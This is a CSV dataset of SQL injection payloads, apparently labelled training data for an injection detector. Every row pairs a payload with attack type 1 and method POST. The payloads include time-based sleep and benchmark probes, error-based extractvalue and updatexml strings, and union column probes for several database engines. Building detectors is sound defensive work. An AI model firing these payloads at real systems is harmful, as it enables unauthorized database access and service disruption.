sentence,attack_type,len_payload,http_method
"1'  )  )   )  or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( 'nlky' like 'nlky",1,232,POST
"1'  )  )   )  or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( 'zglq' = 'zglq",1,229,POST
"1  )  )   )  or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,155,POST
"1'  )  )   )  or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,156,POST
"1  )  )   )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and   (  (   ( 6583 = 6583",1,177,POST
"1'  )  )   )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and   (  (   ( 'cylu' = 'cylu",1,181,POST
"1'  )  )   )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and   (  (   ( 'jhle' like 'jhle",1,184,POST
"1'  )  )   )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and   (  (   ( 'ujjr' = 'ujjr",1,181,POST
"1  )  )   )  or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,196,POST
"1'  )  )   )  or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,197,POST
"1  )  )   )  or elt ( 5873 = 5873,sleep ( 5  )  )  #",1,52,POST
"1'  )  )   )  or elt ( 5873 = 5873,sleep ( 5  )  )  #",1,53,POST
"1  )  )   )  or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (   ( 9558 = 9558",1,78,POST
"1'  )  )   )  or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (   ( 'ayjb' like 'ayjb",1,85,POST
"1'  )  )   )  or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (   ( 'cjre' = 'cjre",1,82,POST
"1'  )  )   )  or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (   ( 'pded' = 'pded",1,82,POST
"1  )  )   )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( 2230 = 2230",1,177,POST
"1'  )  )   )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( 'fbsi' like 'fbsi",1,184,POST
"1'  )  )   )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( 'jwbt' = 'jwbt",1,181,POST
"1'  )  )   )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( 'toft' = 'toft",1,181,POST
"1  )  )   )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and   (  (   ( 4510 = 4510",1,154,POST
"1'  )  )   )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and   (  (   ( 'ccqs' = 'ccqs",1,158,POST
"1'  )  )   )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and   (  (   ( 'dqjq' = 'dqjq",1,158,POST
"1'  )  )   )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and   (  (   ( 'swua' like 'swua",1,161,POST
"1'  )  )   )  or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and   (  (   ( 'drvk' like 'drvk",1,293,POST
"1'  )  )   )  or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and   (  (   ( 'aduc' = 'aduc",1,290,POST
"1'  )  )   )  or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and   (  (   ( 'fvbv' = 'fvbv",1,290,POST
"1  )  )   )  or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and   (  (   ( 1782 = 1782",1,286,POST
1  )  )   )  or sleep ( 5 )  and   (  (   ( 2209 = 2209,1,55,POST
1'  )  )   )  or sleep ( 5 )  and   (  (   ( 'bmnf' like 'bmnf,1,62,POST
1'  )  )   )  or sleep ( 5 )  and   (  (   ( 'ecur' = 'ecur,1,59,POST
1'  )  )   )  or sleep ( 5 )  and   (  (   ( 'wuwv' = 'wuwv,1,59,POST
1  )  )   )  or sleep ( 5 ) #,1,29,POST
1'  )  )   )  or sleep ( 5 ) #,1,30,POST
"1  )  )   )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and   (  (   ( 9474 = 9474",1,154,POST
"1'  )  )   )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and   (  (   ( 'eugs' = 'eugs",1,158,POST
"1'  )  )   )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and   (  (   ( 'yznn' like 'yznn",1,161,POST
"1'  )  )   )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and   (  (   ( 'zpkv' = 'zpkv",1,158,POST
1  )  )   )  order by 1--,1,25,POST
1'  )  )   )  order by 1--,1,26,POST
1  )  )   )  order by 1#,1,24,POST
1'  )  )   )  order by 1#,1,25,POST
"1  )  )   )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and   (  (   ( 7813 = 7813",1,199,POST
"1'  )  )   )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and   (  (   ( 'gfll' = 'gfll",1,203,POST
"1'  )  )   )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and   (  (   ( 'ichh' like 'ichh",1,206,POST
"1'  )  )   )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and   (  (   ( 'wnzv' = 'wnzv",1,203,POST
"1  )  )   )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and   (  (   ( 1748 = 1748",1,157,POST
"1'  )  )   )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and   (  (   ( 'aqdj' = 'aqdj",1,161,POST
"1'  )  )   )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and   (  (   ( 'dzzx' = 'dzzx",1,161,POST
"1'  )  )   )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and   (  (   ( 'vbda' like 'vbda",1,164,POST
"1  )  )   )  procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1,131,POST
"1'  )  )   )  procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1,132,POST
1'  )  )   )  rlike  ( select  ( case when  ( 4076 = 4881 )  then 1 else 0x28 end  )  )   and   (  (   ( 'grzs' = 'grzs,1,119,POST
1  )  )   )  rlike  ( select  ( case when  ( 4367 = 6879 )  then 1 else 0x28 end  )  )   and   (  (   ( 2542 = 2542,1,115,POST
1'  )  )   )  rlike  ( select  ( case when  ( 5524 = 9582 )  then 1 else 0x28 end  )  )   and   (  (   ( 'okoj' like 'okoj,1,122,POST
1'  )  )   )  rlike  ( select  ( case when  ( 5855 = 7142 )  then 1 else 0x28 end  )  )   and   (  (   ( 'fkhd' = 'fkhd,1,119,POST
1  )  )   )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (   ( 2197 = 2197,1,115,POST
1'  )  )   )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (   ( 'gsjp' = 'gsjp,1,119,POST
1'  )  )   )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (   ( 'vtoi' like 'vtoi,1,122,POST
1'  )  )   )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (   ( 'ywbs' = 'ywbs,1,119,POST
1  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (   ( 4574 = 4574,1,102,POST
1'  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (   ( 'npzh' = 'npzh,1,106,POST
1'  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (   ( 'uzmy' like 'uzmy,1,109,POST
1'  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (   ( 'wuux' = 'wuux,1,106,POST
1  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #,1,76,POST
1'  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #,1,77,POST
1  )  )   )  rlike sleep ( 5 )  and   (  (   ( 6790 = 6790,1,58,POST
1'  )  )   )  rlike sleep ( 5 )  and   (  (   ( 'rozr' like 'rozr,1,65,POST
1'  )  )   )  rlike sleep ( 5 )  and   (  (   ( 'svuu' = 'svuu,1,62,POST
1'  )  )   )  rlike sleep ( 5 )  and   (  (   ( 'zwyx' = 'zwyx,1,62,POST
1  )  )   )  rlike sleep ( 5 ) #,1,32,POST
1'  )  )   )  rlike sleep ( 5 ) #,1,33,POST
1  )  )   )  union all select null--,1,36,POST
1'  )  )   )  union all select null--,1,37,POST
1  )  )   )  union all select null#,1,35,POST
1'  )  )   )  union all select null#,1,36,POST
"1  )  )   )  union all select null,null--",1,41,POST
"1'  )  )   )  union all select null,null--",1,42,POST
"1  )  )   )  union all select null,null#",1,40,POST
"1'  )  )   )  union all select null,null#",1,41,POST
"1  )  )   )  union all select null,null,null--",1,46,POST
"1'  )  )   )  union all select null,null,null--",1,47,POST
"1  )  )   )  union all select null,null,null#",1,45,POST
"1'  )  )   )  union all select null,null,null#",1,46,POST
"1  )  )   )  union all select null,null,null,null--",1,51,POST
"1'  )  )   )  union all select null,null,null,null--",1,52,POST
"1  )  )   )  union all select null,null,null,null#",1,50,POST
"1'  )  )   )  union all select null,null,null,null#",1,51,POST
"1  )  )   )  union all select null,null,null,null,null--",1,56,POST
"1'  )  )   )  union all select null,null,null,null,null--",1,57,POST
"1  )  )   )  union all select null,null,null,null,null#",1,55,POST
"1'  )  )   )  union all select null,null,null,null,null#",1,56,POST
"1  )  )   )  union all select null,null,null,null,null,null--",1,61,POST
"1'  )  )   )  union all select null,null,null,null,null,null--",1,62,POST
"1  )  )   )  union all select null,null,null,null,null,null#",1,60,POST
"1'  )  )   )  union all select null,null,null,null,null,null#",1,61,POST
"1  )  )   )  union all select null,null,null,null,null,null,null--",1,66,POST
"1'  )  )   )  union all select null,null,null,null,null,null,null--",1,67,POST
"1  )  )   )  union all select null,null,null,null,null,null,null#",1,65,POST
"1'  )  )   )  union all select null,null,null,null,null,null,null#",1,66,POST
"1  )  )   )  union all select null,null,null,null,null,null,null,null--",1,71,POST
"1'  )  )   )  union all select null,null,null,null,null,null,null,null--",1,72,POST
"1  )  )   )  union all select null,null,null,null,null,null,null,null#",1,70,POST
"1'  )  )   )  union all select null,null,null,null,null,null,null,null#",1,71,POST
"1  )  )   )  union all select null,null,null,null,null,null,null,null,null--",1,76,POST
"1'  )  )   )  union all select null,null,null,null,null,null,null,null,null--",1,77,POST
"1  )  )   )  union all select null,null,null,null,null,null,null,null,null#",1,75,POST
"1'  )  )   )  union all select null,null,null,null,null,null,null,null,null#",1,76,POST
"1  )  )   )  union all select null,null,null,null,null,null,null,null,null,null--",1,81,POST
"1'  )  )   )  union all select null,null,null,null,null,null,null,null,null,null--",1,82,POST
"1  )  )   )  union all select null,null,null,null,null,null,null,null,null,null#",1,80,POST
"1'  )  )   )  union all select null,null,null,null,null,null,null,null,null,null#",1,81,POST
1  )  )   )  waitfor delay '0:0:5'--,1,36,POST
1'  )  )   )  waitfor delay '0:0:5'--,1,37,POST
1  )  )   )  waitfor delay '0:0:5' and   (  (   ( 3481 = 3481,1,61,POST
1'  )  )   )  waitfor delay '0:0:5' and   (  (   ( 'clcf' = 'clcf,1,65,POST
1'  )  )   )  waitfor delay '0:0:5' and   (  (   ( 'wvzb' = 'wvzb,1,65,POST
1'  )  )   )  waitfor delay '0:0:5' and   (  (   ( 'zhhf' like 'zhhf,1,68,POST
1'  )  )   and  ( 1427 = 5813 ) *5813 and   (  (  'estb' like 'estb,1,67,POST
1  )  )   and  ( 3020 = 3020 ) *6703 and   (  (  3078 = 3078,1,60,POST
1'  )  )   and  ( 3020 = 3020 ) *6703 and   (  (  'mgfd' = 'mgfd,1,64,POST
1'  )  )   and  ( 3020 = 3020 ) *6703 and   (  (  'pfal' = 'pfal,1,64,POST
1'  )  )   and  ( 3020 = 3020 ) *6703 and   (  (  'vvkd' like 'vvkd,1,67,POST
1  )  )   and  ( 4169 = 9887 ) *9887 and   (  (  1137 = 1137,1,60,POST
1'  )  )   and  ( 5091 = 8681 ) *8681 and   (  (  'xevm' = 'xevm,1,64,POST
1'  )  )   and  ( 7517 = 3423 ) *3423 and   (  (  'aenz' = 'aenz,1,64,POST
1  )  )   and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and   (  (  5171 = 5171,1,94,POST
1'  )  )   and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and   (  (  'tjvy' like 'tjvy,1,101,POST
1'  )  )   and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and   (  (  'vpqr' = 'vpqr,1,98,POST
1'  )  )   and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and   (  (  'wevl' = 'wevl,1,98,POST
1  )  )   and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,1,71,POST
1'  )  )   and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,1,72,POST
"1  )  )   and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  5776 = 5776",1,235,POST
"1'  )  )   and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  'bgdp' = 'bgdp",1,239,POST
"1'  )  )   and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  'kqip' like 'kqip",1,242,POST
"1'  )  )   and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  'yzdp' = 'yzdp",1,239,POST
"1  )  )   and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (  5349 = 5349",1,246,POST
"1'  )  )   and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (  'fgox' like 'fgox",1,253,POST
"1'  )  )   and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (  'igqm' = 'igqm",1,250,POST
"1'  )  )   and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (  'mymg' = 'mymg",1,250,POST
1  )  )   and 2006 = 2006,1,25,POST
1'  )  )   and 2006 = 2006,1,26,POST
"1  )  )   and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1,66,POST
"1'  )  )   and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1,67,POST
1'  )  )   and 2401 = 4693 and   (  (  'ssrm' = 'ssrm,1,53,POST
"1  )  )   and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,172,POST
"1'  )  )   and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,173,POST
1'  )  )   and 2832 = 4165--,1,28,POST
1'  )  )   and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  'guxv' = 'guxv,1,300,POST
1'  )  )   and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  'yhku' like 'yhku,1,303,POST
1'  )  )   and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  'esal' = 'esal,1,300,POST
1  )  )   and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  5281 = 5281,1,296,POST
1  )  )   and 2886 = 1133--,1,27,POST
"1  )  )   and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  2939 = 2939",1,116,POST
"1'  )  )   and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  'nbsr' like 'nbsr",1,123,POST
"1'  )  )   and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  'novq' = 'novq",1,120,POST
"1'  )  )   and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  'qgdv' = 'qgdv",1,120,POST
1  )  )   and 3228 = 7376#,1,26,POST
1  )  )   and 3249 = 2985,1,25,POST
1'  )  )   and 3355 = 6012 and   (  (  'ofmy' = 'ofmy,1,53,POST
1'  )  )   and 3526 = 1354,1,26,POST
"1  )  )   and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,115,POST
"1'  )  )   and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,116,POST
"1  )  )   and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (  7200 = 7200",1,144,POST
"1'  )  )   and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (  'ijyi' = 'ijyi",1,148,POST
"1'  )  )   and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (  'sied' = 'sied",1,148,POST
"1'  )  )   and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (  'tkcy' like 'tkcy",1,151,POST
1'  )  )   and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  'hcpo' like 'hcpo,1,297,POST
1'  )  )   and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  'mmow' = 'mmow,1,294,POST
